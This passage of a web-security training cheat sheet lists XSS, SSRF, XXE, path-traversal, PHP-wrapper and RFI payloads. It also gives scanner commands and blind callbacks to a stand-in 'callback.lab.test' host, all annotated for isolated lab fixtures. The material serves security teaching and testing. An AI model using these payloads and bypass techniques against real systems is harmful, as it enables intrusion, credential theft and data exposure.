    <!-- 3. Executed via HTML5 video loading failure. -->
    <video><source onerror="alert(1)"></video>

    <!-- 4. Modern tag event handler executing on toggle event. -->
    <details open ontoggle=alert(1)>

    <!-- 5. URI-based execution hidden within a hyperlink. -->
    <a href="javascript:alert(1)">Click to Win</a>

    <!-- 6. Double escaped payload utilizing the `srcdoc` attribute of an iframe. -->
    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

    <!-- 7. Execution via marquee start event. -->
    <marquee onstart=alert(1)>Scroll</marquee>

    <!-- 8. MathML tag link event execution (standard browser support). -->
    <math href="javascript:alert(1)">CLICK</math>

    <!-- 9. Self-triggering focus state payload. -->
    <select autofocus onfocus=alert(1)>

    <!-- 10. Uses Base64-encoded data URI in an `<object>` tag to completely hide the JavaScript syntax from signature scanners. -->
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
    ```
*   **Automated Tool**:
    *   *Notes*: Use XSStrike or dalfox with session headers to scan Stored XSS, or send payloads to OOB Server.
    *   *English rewrite*: Use XSStrike or dalfox with session headers to scan for stored vectors, or send payloads to OOB servers.<!-- payload-id: CHEAT-02-004 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.2. Stored XSS (stored XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the synthetic payload is stored and creates a local DOM/callback marker when viewed in the vulnerable profile; the fixed profile renders inert text; tool output must match the paired application/browser/process log -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan Stored XSS on form endpoints by providing authenticated session headers
    python xsstrike.py -u "http://victim.lab.test/feedback" --data "name=user&msg=test" --headers "Cookie: PHPSESSID=abc123xyz"
    # Scan for Blind XSS (often Stored) routing payloads to your Out-of-Band callback server
    dalfox url "http://victim.lab.test/register?name=test" -b "https://callback.lab.test"
    ```

---

### 2.3. DOM-based XSS (XSS based on DOM)

*   **Identification / Signs**:
    *   *Notes*: Occurs entirely on the client side (Client-side). The vulnerability arises when the website's JavaScript reads data from an unsafe source and writes it directly to a sensitive point capable of executing code (Sink) without any sanitization.
    *   *English rewrite*: DOM-based XSS is a client-side vulnerability. It occurs when JavaScript scripts on the page read from user-controlled inputs (Sources) and pass them to execution functions (Sinks) in the Document Object Model without sanitization.
*   **Suspicion / Checking**:
    *   *Notes*: Examine the JavaScript source code in the browser (Developer Tools -> Sources) to find data sources controllable by the user (such as `location.hash`, `location.search`, `document.referrer`) that are passed directly into dangerous functions (such as `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`).
    *   *English rewrite*: Analyze client-side JS scripts. Identify input sources (e.g., `location.hash`) feeding directly into dangerous sinks (e.g., `element.innerHTML`, `eval()`). Manipulate the URL hash or query parameters and trace execution flow.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-02-005 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.3. DOM-based XSS (DOM-based XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the documented source reaches the named DOM sink and creates a local marker; the fixed sink uses a text/URL-safe API and does not execute script -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Hash parameter injected into a sink like `innerHTML`. -->
    #<img src=1 onerror=alert(1)>

    <!-- 2. Query parameter injected into a sink like `document.write`. -->
    ?name=<svg onload=alert(1)>

    <!-- 3. For navigation sinks: `location.href = source`. -->
    javascript:alert(1)

    <!-- 4. Escaping a JavaScript string/JSON variable context in the client script. -->
    ';alert(1);'

    <!-- 5. Escaped single quote bypass for client-side sanitizers. -->
    \';alert(1)//

    <!-- 6. Injected into attribute configuration sinks. -->
    "onmouseover="alert(1)

    <!-- 7. Dynamic Base64 payload for redirection sinks. -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

    <!-- 8. Breaks out of inline JavaScript code block/function contexts. -->
    }alert(1);{//

    <!-- 8b. AngularJS client-side template injection (sandbox breakout). -->
    {{constructor.constructor('alert(1)')()}}

    <!-- 9. Obfuscated JS execution inside redirection/eval sinks. -->
    javascript:eval(atob('YWxlcnQoMSk='))

    <!-- 10. Encoded payload using ES6 dynamic `import()` to load only the loopback lab recorder script. -->
    %23%3Cimg%20src%3Dx%20onerror%3D%22import(%27http%3A%2F%2Fcallback.lab.test%2Fxss-probe.js%27)%22%3E
    ```
*   **Automatic Tool**:
    *   *Notes*: Use dalfox with `--deep-dom` option to analyze client-side sources/sinks and detect DOM XSS.
    *   *English rewrite*: Use dalfox with `--deep-dom` option to automatically analyze client-side sources/sinks and identify DOM XSS.<!-- payload-id: CHEAT-02-006 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.3. DOM-based XSS (DOM-based XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the documented source reaches the named DOM sink and creates a local marker; the fixed sink uses a text/URL-safe API and does not execute script; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan DOM-based XSS by processing JavaScript sources and sinks automatically
    dalfox url "http://victim.lab.test/index.html?hash=test" --headless
    # Fuzz DOM inputs using custom wordlists containing browser-breakout payloads
    dalfox pipe < urls.txt --custom-payload /path/to/dom_payloads.txt
    ```

---

## References

- **[S1]** OWASP Cross Site Scripting Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 3. Server-Side Request Forgery (SSRF)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

Server-Side Request Forgery (SSRF) occurs when a server is tricked into sending HTTP/HTTPS requests to an arbitrary IP address or domain (usually internal servers or services behind a firewall).

> **Related lesson:** [SSRF](01-broken-access-control/ssrf/), [XXE](05-injection/xxe/), [Shadow APIs](11-api-security/shadow-apis/).

### 3.1. Basic SSRF (Basic SSRF - with data feedback)

*   **Identification / Signs**:
    *   *Notes*: Occurs when the application sends a HTTP request to the server (Server-side HTTP request) based on URL provided by the user and returns all or part of that response data to the user (e.g., functionality to load images from a link, convert document formats).
    *   *English rewrite*: Basic SSRF occurs when the server fetches a user-provided URL and displays the response content, headers, or structure back to the user.
*   **Suspected / Testing**:
    *   *Notes*: Enter local addresses (`http://127.0.0.1` or `http://localhost`) or internal ports (`http://127.0.0.1:22`, `http://127.0.0.1:6379`). If a SSH banner, Redis error, or internal admin interface appears on the screen, the vulnerability exists.
    *   *English rewrite*: Inject local loopback addresses (`http://127.0.0.1`, `http://localhost`) or internal ports (`http://127.0.0.1:22`, `http://127.0.0.1:6379`) to check for internal services and raw responses.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-03-001 -->
<!-- context: URL input fetched by a local HTTP client fixture; loopback-only mock services -->
<!-- prerequisites: fixture network namespace contains only mock services on 127.0.0.1; no outbound route -->
<!-- encoding: URL strings exactly as shown; resolver behavior for alternate IP forms must be recorded -->
<!-- expected-result: vulnerable fixture reaches only the documented mock port; hardened fixture rejects loopback after canonicalization -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # 1. Basic local loopback test.
    http://127.0.0.1:80

    # 2. Alternate local mock port.
    http://localhost:18080

    # 3. IPv6 loopback bypass.
    http://[::1]:18080

    # 4. Reserved test name mapped to loopback inside the fixture only.
    http://loopback.lab.test:18080

    # 5. Decimal representation of IP 127.0.0.1.
    http://2130706433

    # 6. Hexadecimal representation of IP 127.0.0.1.
    http://0x7f000001

    # 7. Octal representation of IP 127.0.0.1.
    http://0177.0000.0000.0001

    # 8. Shortened IP representation.
    http://127.1

    # 9. Reserved test callback name mapped by the local fixture DNS.
    http://callback.lab.test:18080

    # 10. Scheme allowlist negative case; the hardened fixture must reject it.
    dict://127.0.0.1:18080/info
    ```
*   **Automated Tool**:
    *   *Notes*: Use ssrfmap to automatically test internal ports on parameters that return data.
    *   *English rewrite*: Use ssrfmap to automatically test internal ports on parameters that return data.<!-- payload-id: CHEAT-03-002 -->
<!-- context: Python 3.12 and requests 2.32 fetcher in a network namespace; mock HTTP, DNS and metadata services listen only on 127.0.0.1:18080-18082; case: 3.1. Basic SSRF (basic SSRF with response data) -->
<!-- prerequisites: block all egress except the mock network, reset redirect/DNS state between cases and confirm destination access only from mock logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the intentionally vulnerable fetcher reaches the loopback internal marker; the fixed fetcher blocks the destination before connection and logs the denial -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz internal ports using ssrfmap in standard request files
    python ssrfmap.py -r req.txt -p url -m portscan
    ```

---


### 3.2. Blind SSRF (SSRF blind - no data response)

*   **Identification / Signs**:
    *   *Notes*: When the server makes a request to URL but does not return any data on the interface. Error or success status can only be detected through network behavior or response delay HTTP (Timing differences).
    *   *English rewrite*: Blind SSRF exists when the server issues the web request but hides the response content. Verification must be performed using out-of-band monitoring or timing checks.
*   **Suspicion / Verification**:
    *   *Notes*: In this curriculum, the callback must point to a mock listener within the same network namespace. Confirm via correlation ID in the mock log; do not use Burp Collaborator, Interactsh, or Internet callbacks.
    *   *English rewrite*: This curriculum uses only a mock listener in the same local network namespace. Correlate the fixture request with the mock log; do not use an Internet callback service.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-03-003 -->
<!-- context: URL input with a mock HTTP callback bound to 127.0.0.1:18081 -->
<!-- prerequisites: callback is local, tagged probe-42 and outbound network is disabled -->
<!-- encoding: URL path is ASCII; no DNS lookup is required -->
<!-- expected-result: mock listener records one GET /callback/probe-42 with the fixture correlation ID -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # Positive probe handled by the local mock listener.
    http://127.0.0.1:18081/callback/probe-42

    # IPv6 loopback variant when the fixture binds IPv6 explicitly.
    http://[::1]:18081/callback/probe-42

    # Reserved fixture name; local DNS must map it to the mock only.
    http://callback.lab.test:18081/callback/probe-42
    ```
*   **Automatic Tool**:
    *   *Notes*: Start a local mock callback, retain the access log, and correlate the ID correlation from the fixture application.
    *   *English rewrite*: Start a local mock callback, retain its access log, and correlate it with the application fixture.<!-- payload-id: CHEAT-03-004 -->
<!-- context: Python 3 local HTTP mock bound to loopback -->
<!-- prerequisites: port 18081 is free; command runs only inside the isolated fixture namespace -->
<!-- encoding: HTTP served by Python standard library; access log is written to stderr -->
<!-- expected-result: requesting /callback/probe-42 produces a local access-log entry; no Internet DNS/HTTP occurs -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Start a loopback-only callback mock inside the disposable fixture
    python3 -m http.server 18081 --bind 127.0.0.1
    ```

---

### 3.3. Cloud Metadata SSRF (SSRF cloud service Metadata exploitation)

*   **Identification / Signs**:
    *   *Notes*: On cloud infrastructure, workloads can access the metadata service via the provider's reserved address. SSRF can expose metadata or credentials if the provider/runtime policy does not require additional protection mechanisms.
    *   *English rewrite*: On cloud infrastructure, workloads can access the metadata service via the provider's reserved address. SSRF can expose metadata or credentials if provider and runtime protections are insufficient.
*   **Suspicion / Testing**:
    *   *Notes*: Only use a local mock metadata endpoint with synthetic data. The provider paths below simulate semantics to check allowlist/egress policies and do not point to real IP metadata.
    *   *English rewrite*: Only use a local mock metadata endpoint with synthetic data. The provider paths below simulate semantics to check allowlist/egress policies; they do not point to real IP metadata.
*   **Payloads (10 Payloads):**<!-- payload-id: CHEAT-03-005 -->
<!-- context: provider-style paths served by mock metadata at 127.0.0.1:18082 -->
<!-- prerequisites: mock returns fake identifiers only; link-local metadata routes are absent; outbound network is disabled -->
<!-- encoding: URL query strings are UTF-8/ASCII and generated exactly as shown -->
<!-- expected-result: vulnerable fixture reaches the mock and returns fake marker data; hardened fixture rejects the destination before connect -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # AWS-style fake role-name path.
    http://127.0.0.1:18082/latest/meta-data/iam/security-credentials/

    # GCP-style fake token path; mock verifies the required header separately.
    http://127.0.0.1:18082/computeMetadata/v1/instance/service-accounts/default/token

    # Azure-style fake instance path; mock verifies Metadata: true separately.
    http://127.0.0.1:18082/metadata/instance?api-version=2021-02-01
    ```
*   **Automated Tool**:
    *   *Notes*: Use the fixture client to call the local metadata mock and confirm that the destination policy blocks before connecting.
    *   *English rewrite*: Use the fixture client against the local metadata mock and verify that the destination policy blocks before connect.<!-- payload-id: CHEAT-03-006 -->
<!-- context: curl against local metadata mock health endpoint -->
<!-- prerequisites: mock is bound to 127.0.0.1:18082 and returns no credential-shaped fields -->
<!-- encoding: HTTP/1.1 generated by curl; no provider link-local address -->
<!-- expected-result: health endpoint returns the literal marker SECHUB_METADATA_MOCK -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Verify that the local metadata mock is ready before the SSRF regression test
    curl --fail --max-time 2 http://127.0.0.1:18082/health
    ```

---

## References

- **[S1]** OWASP SSRF Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html — current version; access: 2026-07-18.

---

## 4. XML External Entity (XXE)

> [!CAUTION]
> Only for use in an authorized local lab. The fixture must block outbound network, only mount synthetic data, and limit CPU/memory/time.

> **Scope of use:** The blocks below are lab examples according to the context/version noted in the annotation. Variants dependent on local DTD, wrapper, legacy encoding, or tools are not retained until a restoration fixture is available.

XXE occurs when the XML parser resolves an external entity controlled by the actor. The conclusion must be based on the fixture's file/mock-service/callback marker, not solely on the parser error.

> **Related lesson:** [XXE](05-injection/xxe/), [SSRF](01-broken-access-control/ssrf/), [XML Bombs](10-exceptional-conditions/xml-bombs/).

### 4.1. External entity reads fixture file

<!-- payload-id: CHEAT-04-001 -->
<!-- context: Java 17 JAXP fixture with external general entities deliberately enabled; synthetic file mounted at /tmp/sechub-lab/fixture.txt -->
<!-- prerequisites: run in a disposable container; mount only the named synthetic file; record parser configuration and block outbound network -->
<!-- encoding: UTF-8 XML bytes matching the declaration; no transport-layer decode -->
<!-- expected-result: the vulnerable fixture returns the synthetic SECHUB marker; the fixed parser rejects DOCTYPE/external resolution -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY marker SYSTEM "file:///tmp/sechub-lab/fixture.txt">
]>
<root>&marker;</root>
```
### 4.2. External entity to mock HTTP service

<!-- payload-id: CHEAT-04-002 -->
<!-- context: Java 17 JAXP fixture; mock HTTP service listens only at 127.0.0.1:18082 and returns SECHUB_HTTP_MARKER -->
<!-- prerequisites: isolate the network namespace; allow only the mock address; capture parser and mock-service logs -->
<!-- encoding: UTF-8 XML bytes; the HTTP URL is not normalized or decoded by another layer -->
<!-- expected-result: the vulnerable parser makes one request to the mock service; the fixed parser makes none -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY marker SYSTEM "http://127.0.0.1:18082/marker">
]>
<root>&marker;</root>
```
### 4.3. Blind callback to local recorder

<!-- payload-id: CHEAT-04-003 -->
<!-- context: Java 17 JAXP fixture; callback.lab.test resolves to a loopback HTTP recorder on port 18081 -->
<!-- prerequisites: use a network namespace with no public egress; reset recorder state and capture exactly one parse attempt -->
<!-- encoding: UTF-8 XML bytes; parameter-entity percent signs are preserved -->
<!-- expected-result: the vulnerable parser creates one loopback callback; the fixed parser rejects the DTD and creates none -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % callback SYSTEM "http://callback.lab.test:18081/ping">
  %callback;
]>
<root>SECHUB</root>
```

## References

- **[S1]** OWASP XML External Entity Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html — current version; accessed: 2026-07-18.
- **[S2]** PortSwigger Web Security Academy — XML external entity injection. https://portswigger.net/web-security/xxe — current version; accessed: 2026-07-18.

---

## 5. LFI/RFI + Path Traversal

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

LFI/RFI + Path Traversal occurs when an application receives input as a file path name and reads or loads that file without validation, allowing reading files outside the allowed scope or loading untrusted content. The payloads below only use synthetic markers in a local fixture, not reading actual system files.

> **Related Lesson:** [LFI/RFI](05-injection/lfi-rfi/), [Directory Traversal](01-broken-access-control/directory-traversal/), [Information Leakage](06-insecure-design/information-leakage/).

### 5.1. Basic Path Traversal / LFI
*   **Identification / Signs**:
    *   *Notes*: Occurs when the application uses parameters in the URL or POST body to specify filenames to read, load, or include (such as `file=`, `page=`, `doc=`).
    *   *English rewrite*: Identified by parameters specifying filenames or paths in requests (such as `file=`, `page=`, `doc=`), returning synthetic marker content or static resources.
*   **Suspicion / Testing**:
    *   *Notes*: Try sending directory traversal strings like `../` or `..\` along with marker filenames in the synthetic fixture to see if the application returns the contents of that file.
    *   *English rewrite*: Input directory traversal sequences like `../` or `..\` combined with synthetic marker filenames and analyze response text.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-05-001 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.1. Basic Path Traversal / LFI -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable include reads the mounted synthetic marker outside the public directory; the allowlist/containment control returns 404 without opening it -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
../../../../tmp/sechub-lab/fixture.txt               # Synthetic fixture file lookup
../../../../tmp/sechub-lab/hosts.fixture             # Synthetic marker replacing host lookup files
../../../../tmp/sechub-lab/issue.fixture             # Synthetic marker replacing OS release files
../../../../tmp/sechub-lab/resolver.fixture          # Synthetic marker replacing resolver configuration files
..\..\..\..\sechub-lab\win.ini.fixture               # Synthetic Windows marker replacing win.ini
..\..\..\..\sechub-lab\hosts.fixture                 # Synthetic Windows marker replacing host lookup files
/tmp/sechub-lab/fixture.txt                          # Absolute synthetic marker lookup
C:\sechub-lab\win.ini.fixture                        # Absolute synthetic Windows marker lookup
/tmp/sechub-lab/process-cmdline.txt                  # Synthetic process-metadata marker fixture
....//....//....//tmp/sechub-lab/fixture.txt         # Nested traversal toward a synthetic marker
```
*   **Automatic Tool**:
    *   *Notes*: Use ffuf or wfuzz to automatically scan LFI parameters and paths with a fixture-only wordlist replaced by a synthetic marker.
    *   *English rewrite*: Use ffuf or wfuzz to automate scanning for LFI parameters and traversal paths using a fixture-only synthetic marker list.<!-- payload-id: CHEAT-05-002 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.1. Basic Path Traversal / LFI -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable include reads the mounted synthetic marker outside the public directory; the allowlist/containment control returns 404 without opening it; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    ffuf -u 'http://victim.lab.test/index.php?file=FUZZ' -w /tmp/sechub-lab/lfi-fixture-paths.txt -fs <normal_size>
    ```


---

### 5.2. PHP Wrappers
*   **Identification / Signs**:
    *   *Notes*: Applications running on the PHP platform and supporting file loading mechanisms through built-in wrappers.
    *   *English rewrite*: The web server is powered by PHP and accepts input streams routed to standard integrated wrappers.
*   **Suspicion / Testing**:
    *   *Notes*: Try inserting `php://filter/convert.base64-encode/resource=index.php` to retrieve source code in Base64 without executing it.
    *   *English rewrite*: Try passing wrappers such as `php://filter` to dump source code as Base64.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-05-003 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.2. PHP Wrappers -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: only the enabled PHP wrapper returns the synthetic reference source in the disposable fixture; the fixed allowlist rejects wrapper schemes -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
php://filter/convert.base64-encode/resource=index.php # Base64 encode filter read to bypass execution
php://filter/read=string.rot13/resource=index.php     # ROT13 filter read bypass
php://input                                           # POST data input wrapper carrying inert marker text only
data://text/plain,SECHUB_INCLUDE_MARKER               # Inert marker text (requires allow_url_include=On)
data://text/plain;base64,U0VDSFVCX0lOQ0xVREVfTUFSS0VS # Base64 inert marker text
zip://uploads/avatar.zip%23fixtures/marker.lab.txt    # Reads inert marker text inside uploaded ZIP fixture
phar://uploads/avatar.png/fixtures/marker.lab.txt     # Reads inert marker text inside PHAR fixture
php://filter/read=string.toupper/resource=config.php  # Uppercase conversion wrapper test
php://filter/zlib.deflate/convert.base64-encode/resource=config.php # Compressed and base64-encoded source read
php://filter/read=convert.base64-encode/resource=/tmp/sechub-lab/fixture.txt # Base64 read of synthetic fixture
```
*   **Automatic Tool**:
    *   *Notes*: Use ffuf to fuzz PHP wrappers and automatically extract source code.
    *   *English rewrite*: Use ffuf to fuzz PHP wrappers and automatically extract source code.<!-- payload-id: CHEAT-05-004 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.2. PHP Wrappers -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the enabled PHP wrapper returns the synthetic reference source in the disposable fixture; the fixed allowlist rejects wrapper schemes; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    ffuf -u 'http://victim.lab.test/index.php?file=FUZZ' -w /tmp/sechub-lab/php-wrapper-source-read-list.txt -fs <normal_size>
    ```


---

### 5.3. Log Poisoning
*   **Identification / Signs**:
    *   *Notes*: The LFI vulnerability has been detected and server log files (such as Apache/Nginx access log) are in readable locations.
    *   *English rewrite*: A path traversal vulnerability is confirmed, and server log files are hosted in readable directories.
*   **Suspicion / Verification**:
    *   *Notes*: Access synthetic log paths like `/tmp/sechub-lab/apache-access.log` and check if the User-Agent marker appears there.
    *   *English rewrite*: Attempt to read synthetic logs such as `/tmp/sechub-lab/nginx-access.log` and verify if request details reflect on page.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-05-005 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.3. Log Poisoning -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable PHP fixture reads only the injected harmless marker from its synthetic access log; the fixed deployment stores logs outside executable include paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
/tmp/sechub-lab/apache-access.log                    # Synthetic Apache-format log
/tmp/sechub-lab/nginx-access.log                     # Synthetic Nginx-format log
/tmp/sechub-lab/auth.log                             # Synthetic auth-log fixture
/tmp/sechub-lab/mail.log                             # Synthetic mail-log fixture
/tmp/sechub-lab/sessions/sess_<session_id>           # Synthetic PHP-session fixture
C:\sechub-lab\sessions\sess_<session_id>             # Synthetic Windows session marker fixture
/tmp/sechub-lab/process-environ.txt                  # Synthetic environment fixture
/tmp/sechub-lab/stdin.txt                            # Synthetic stdin fixture
C:\sechub-lab\iis-access.log                         # Synthetic IIS-format log
/tmp/sechub-lab/access.log?marker=SECHUB_LOG_MARKER  # Inert marker query copied into synthetic log fixture
```
*   **Automatic Tool**:
    *   *Notes*: Use curl to send marker text into the User-Agent header in the local fixture, then read back the synthetic log via LFI.
    *   *English rewrite*: Use curl to inject inert marker text into the User-Agent header in the local fixture, then reference the synthetic log using LFI.<!-- payload-id: CHEAT-05-006 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.3. Log Poisoning -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable PHP fixture reads only the injected harmless marker from its synthetic access log; the fixed deployment stores logs outside executable include paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    curl -s -A "SECHUB_LOG_MARKER" "http://victim.lab.test/index.php"
    curl -s "http://victim.lab.test/index.php?file=/tmp/sechub-lab/apache-access.log"
    ```


---

### 5.4. Remote File Inclusion (RFI)
*   **Identification / Signs**:
    *   *Notes*: Occurs when the application accepts a full URL as a file loading parameter and loads its content into the processing thread.
    *   *English rewrite*: Present when the application permits full callback URLs in file loading parameters and loads them.
*   **Suspicion / Testing**:
    *   *Notes*: Enter an URL callback `.lab.test` pointing to loopback/local recorder (e.g., `http://callback.lab.test/marker.txt`) to see if the target fixture fetches that marker.
    *   *English rewrite*: Input a loopback-resolved `.lab.test` callback URL served by a local recorder and check whether the target fixture fetches the marker.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-05-007 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.4. Remote File Inclusion (RFI) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable fixture fetches only callback.lab.test resolved to the loopback/local recorder and emits its marker; the fixed PHP configuration/allowlist refuses remote schemes -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
http://callback.lab.test/marker.txt                       # Loopback HTTP marker inclusion, no outbound network
https://callback.lab.test/marker.txt                      # Loopback HTTPS marker inclusion, no outbound network
